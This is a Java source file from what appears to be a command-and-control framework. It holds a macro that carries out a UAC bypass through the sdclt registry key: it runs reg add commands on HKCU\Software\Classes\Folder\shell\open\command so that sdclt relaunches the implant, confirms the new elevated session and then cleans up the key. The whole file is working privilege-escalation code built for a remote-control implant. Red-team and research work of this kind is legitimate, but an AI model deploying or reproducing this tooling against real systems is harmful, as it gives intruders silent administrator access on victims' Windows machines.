package c2.session.macro.uac;

import java.util.ArrayList;
import java.util.List;

import c2.Commands;
import c2.WindowsConstants;
import c2.session.macro.AbstractCommandMacro;
import c2.session.macro.MacroOutcome;
import util.Time;

//This macro is inspired by this original research: http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
public class SdcltRegKeyUACMacro extends AbstractCommandMacro{
	
	public static final String CMD = "sdclt_reg_uac";
	
	private static final String INVOCATION_CMD = "$INVOCATION_CMD$";
	private static final String ADD_REG_KEY_TEMPLATE = "reg add \"HKCU\\Software\\Classes\\Folder\\shell\\open\\command\" /d \"" + INVOCATION_CMD + "\" /f";
	private static final String DELEGATE_CMD = "reg add HKCU\\Software\\Classes\\Folder\\shell\\open\\command /v \"DelegateExecute\" /f";
	
	private static final String CLEANUP_CMD = "reg delete \"HKCU\\Software\\Classes\\Folder\\shell\\open\\command\" /f";
	
	@Override
	public String getReadableName() {
		return "SDCLT Registry Key UAC Macro";
	}

	@Override
	public String getInvocationCommandDescription() {
		return CMD + " (optional)'Name of Executable'";
	}

	@Override
	public String getBehaviorDescription() {
		return "This macro will use HKCU\\Software\\Classes\\Folder\\shell\\open\\command to specify an alternate program for SDCLT to open.";
	}

	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equals(CMD) || cmd.startsWith(CMD + " ");
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		String clientCmd = null;
		if(cmd.startsWith(CMD) && !cmd.equals(CMD)) {
			clientCmd = cmd.substring(CMD.length() + 1);
		}else {
			sendCommand(Commands.CLIENT_CMD_GET_EXE, sessionId, outcome);
			clientCmd = awaitResponse(sessionId, outcome);
			clientCmd = clientCmd.replace("\r", "");
			clientCmd = clientCmd.replace("\n", "");
		}
		//First get daemon invocation command
		
		//TODO: Sanity check that command is valid. 
		//TODO: Migrate code to sanitize and validate daemon EXE gathering to a common module
		
		//Add immediate respawn command to respawn. This argument is ignored by the main TAC daemon, but used in a 
		//separate code used for SDCLT respawn disclosure.
		String addRegKeyCommand = ADD_REG_KEY_TEMPLATE.replace(INVOCATION_CMD, clientCmd + " immediate_respawn");
		sendCommand(addRegKeyCommand, sessionId, outcome);
		String cmdOutcome = awaitResponse(sessionId, outcome);
		Time.sleepWrapped(10000);
		if(!cmdOutcome.contains(WindowsConstants.WINDOWS_SYSTEM_OPERATION_COMPLETE_MSG)) {
			outcome.addError("Could not write to registry, aborting");
		}else {
			sendCommand(DELEGATE_CMD, sessionId, outcome);
			cmdOutcome = awaitResponse(sessionId, outcome);
			Time.sleepWrapped(10000);
			if(!cmdOutcome.contains(WindowsConstants.WINDOWS_SYSTEM_OPERATION_COMPLETE_MSG)) {
				outcome.addError("Could not write to registry, aborting");
			}else {
				sendCommand("sdclt", sessionId, outcome);
				cmdOutcome = awaitResponse(sessionId, outcome);//Flush command
				Time.sleepWrapped(5000);
				
				//Confirm that new session was received with admin privs
				Integer highSessionId = io.getSessionId(sessionStr + ":HighIntegrity");
				if(highSessionId == null) {
					outcome.addError("Did not receive a new session");
				}else {
					outcome.addMacroMessage("New elevated session available: " + highSessionId);
				}
			}
		}
		
		sendCommand(CLEANUP_CMD, sessionId, outcome);
		cmdOutcome = awaitResponse(sessionId, outcome);
		if(!cmdOutcome.contains(WindowsConstants.WINDOWS_SYSTEM_OPERATION_COMPLETE_MSG)) {
			outcome.addError("Could not clean up registry key");
		}
		
		return outcome;
	}

}
